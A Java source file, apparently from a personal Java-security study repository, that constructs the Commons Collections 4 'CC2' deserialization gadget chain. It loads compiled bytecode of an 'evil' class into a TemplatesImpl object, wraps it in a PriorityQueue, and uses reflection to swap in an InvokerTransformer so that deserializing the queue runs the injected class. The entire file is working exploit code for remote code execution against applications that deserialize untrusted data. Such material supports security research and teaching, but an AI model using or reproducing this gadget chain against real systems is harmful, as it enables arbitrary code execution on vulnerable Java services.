package com.yyjccc.CommonsExp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.yyjccc.Utils.Tool;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class Cc2 {

    public static String classFilePath="F:\\code\\java\\all-javasec-code\\commons-c_chain_Exp\\target\\classes\\com\\yyjccc\\EvilClass\\ExpClassLoad.class";

    public static Object cc2() throws Exception {
        TemplatesImpl templates= new TemplatesImpl();

        Class tc=templates.getClass();
        Field namefield = tc.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"aaa");
        Field bytecodefield = tc.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        //赋给我们的字节码,二维数组，代码会循环遍历
        byte[] code= Files.readAllBytes(Paths.get(classFilePath));;
        byte [][]  codes={code};
        bytecodefield.set(templates,codes);


        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));

        //创建反序列化入口类

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(templates);


        Class c = transformingComparator.getClass();
        Field tfactoryfeild = c.getDeclaredField("transformer");
        tfactoryfeild.setAccessible(true);
        tfactoryfeild.set(transformingComparator,invokerTransformer);
        return priorityQueue;
    }
}
